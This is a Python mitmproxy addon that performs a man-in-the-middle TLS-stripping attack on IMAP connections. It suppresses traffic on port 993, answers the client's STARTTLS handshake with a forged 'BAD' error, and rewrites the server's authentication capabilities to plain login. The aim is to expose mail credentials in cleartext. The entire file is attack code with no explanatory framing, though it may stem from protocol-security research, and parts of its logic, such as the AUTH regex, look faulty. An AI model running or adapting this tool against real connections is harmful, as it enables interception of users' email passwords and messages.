from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re

class imap_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        
        if not msg.from_client:
            server_msg = bytearray(msg.content)
            if flow.server_conn.peername[1] == 993: # force client not to use implicit TLS
                server_msg = b''
                msg.content = server_msg

            if b'OK Begin TLS negotiation now' in server_msg:
                ctx.log.warn('client sends starttls')
                ctx.log.warn(server_msg)
            if msg.content[0] == 0x16 and msg.content[5] == 0x02 and flow.server_conn.peername[1] == 143:
                ctx.log.warn('reject the STARTTLS after clienthello')
                # server_msg = b''
                server_msg[0:] = b'BAD Error in IMAP command received by server.\r\n'
                msg.content = server_msg
                ctx.log.info(msg.content)
            # force the server to use plain login
            pattern = b'AUTH=*?\r\n'
            match = re.search(pattern, server_msg)
            if match:
                substring = match.group()
                modified_msg = server_msg.replace(substring, b'AUTH=PLAIN\r\n')
                msg.content = modified_msg
            else:
                ctx.log.info("Substring not found")
            

addons = [imap_TCP()]